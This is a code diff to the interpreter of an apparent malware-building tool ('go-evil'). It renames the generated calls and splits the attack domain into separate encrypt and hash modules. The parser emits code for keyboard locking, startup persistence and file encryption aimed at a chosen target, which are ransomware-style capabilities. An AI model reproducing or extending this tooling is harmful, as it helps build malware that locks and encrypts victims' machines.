@@ -4,7 +4,7 @@ import (
 	"regexp"
 	"strings"
 
-	"github.com/s9rA16Bf4/go-evil/domains/attack_vector"
+	attack_hash "github.com/s9rA16Bf4/go-evil/domains/attack_vector/hash"
 	mal "github.com/s9rA16Bf4/go-evil/domains/malware"
 	"github.com/s9rA16Bf4/go-evil/utility/io"
 	"github.com/s9rA16Bf4/go-evil/utility/variables"
@@ -74,18 +74,18 @@ func Interpeter(file_to_read string) {
 			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")
 			switch funct[2] { // Checks the function that were called from the domain
 			case "x":
-				mal.AddContent("win.Window_setX(\"" + funct[4] + "\")")
+				mal.AddContent("win.SetX(\"" + funct[4] + "\")")
 			case "y":
-				mal.AddContent("win.Window_setY(\"" + funct[4] + "\")")
+				mal.AddContent("win.SetY(\"" + funct[4] + "\")")
 
 			case "title":
-				mal.AddContent("win.Window_setTitle(\"" + funct[4] + "\")")
+				mal.AddContent("win.SetTitle(\"" + funct[4] + "\")")
 
 			case "goto":
-				mal.AddContent("win.Window_goToUrl(\"" + funct[4] + "\")")
+				mal.AddContent("win.GoToUrl(\"" + funct[4] + "\")")
 
 			case "display":
-				mal.AddContent("win.Window_display(\"" + funct[4] + "\")")
+				mal.AddContent("win.Display(\"" + funct[4] + "\")")
 
 			default:
 				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
@@ -102,7 +102,7 @@ func Interpeter(file_to_read string) {
 			case "out":
 				mal.AddContent("sys.System_out(\"" + funct[4] + "\")")
 			case "add_to_startup":
-				mal.AddContent("sys.System_add_to_startup()")
+				mal.AddContent("sys.AddToStartup()")
 
 			default:
 				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
@@ -132,19 +132,19 @@ func Interpeter(file_to_read string) {
 
 			switch funct[2] {
 			case "run":
-				mal.AddContent("time.Time_run()")
+				mal.AddContent("time.Run()")
 			case "year":
-				mal.AddContent("time.Time_setYear(\"" + funct[4] + "\")")
+				mal.AddContent("time.SetYear(\"" + funct[4] + "\")")
 			case "month":
-				mal.AddContent("time.Time_setMonth(\"" + funct[4] + "\")")
+				mal.AddContent("time.SetMonth(\"" + funct[4] + "\")")
 			case "day":
-				mal.AddContent("time.Time_setDay(\"" + funct[4] + "\")")
+				mal.AddContent("time.SetDay(\"" + funct[4] + "\")")
 			case "hour":
-				mal.AddContent("time.Time_setHour(\"" + funct[4] + "\")")
+				mal.AddContent("time.SetHour(\"" + funct[4] + "\")")
 			case "min":
-				mal.AddContent("time.Time_setMin(\"" + funct[4] + "\")")
+				mal.AddContent("time.SetMin(\"" + funct[4] + "\")")
 			case "until":
-				mal.AddContent("time.Time_until(\"" + funct[4] + "\")")
+				mal.AddContent("time.Until(\"" + funct[4] + "\")")
 
 			default:
 				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
@@ -155,9 +155,9 @@ func Interpeter(file_to_read string) {
 
 			switch funct[2] {
 			case "lock":
-				mal.AddContent("keyboard.Keyboard_lock()")
+				mal.AddContent("keyboard.Lock()")
 			case "unlock":
-				mal.AddContent("keyboard.Keyboard_unlock()")
+				mal.AddContent("keyboard.Unlock()")
 
 			default:
 				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
@@ -165,26 +165,26 @@ func Interpeter(file_to_read string) {
 		case "attack":
 			notify.Log("Found possible function "+funct[2], notify.Verbose_lvl, "3")
 			switch funct[2] {
-			case "set_target":
-				io.Append_domain("attack_vector")
-				mal.AddContent("attack.Encrypt_set_target(\"" + funct[4] + "\")")
-			case "set_encryption":
-				io.Append_domain("attack_vector")
-				mal.AddContent("attack.Encrypt_set_encryption_method(\"" + funct[4] + "\")")
-			case "encrypt":
-				io.Append_domain("attack_vector")
-				mal.AddContent("attack.Encrypt_encrypt()")
-			case "decrypt":
-				io.Append_domain("attack_vector")
-				mal.AddContent("attack.Encrypt_decrypt()")
+			case "set_target", "set_encryption", "encrypt", "decrypt":
+				io.Append_domain("attack_encrypt")
+				if funct[2] == "set_target" {
+					mal.AddContent("attack_encrypt.SetTarget(\"" + funct[4] + "\")")
+				} else if funct[2] == "set_encryption" {
+					mal.AddContent("attack_encrypt.SetEncryptionMethod(\"" + funct[4] + "\")")
+
+				} else if funct[2] == "encrypt" {
+					mal.AddContent("attack_encrypt.Encrypt()")
+
+				} else if funct[2] == "decrypt" {
+					mal.AddContent("attack_encrypt.Decrypt()")
+
+				}
 
 			// Hash, everything here is done in realtime when compiling.
 			case "set_hash":
-				io.Append_domain("attack_vector")
-				mal.AddContent("attack.Set_hash(\"" + funct[4] + "\")")
-				attack_vector.Set_hash(funct[4])
+				attack_hash.Set_hash(funct[4])
 			case "hash":
-				attack_vector.Hash(funct[4])
+				attack_hash.Hash(funct[4])
 
 			default:
 				notify.Error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
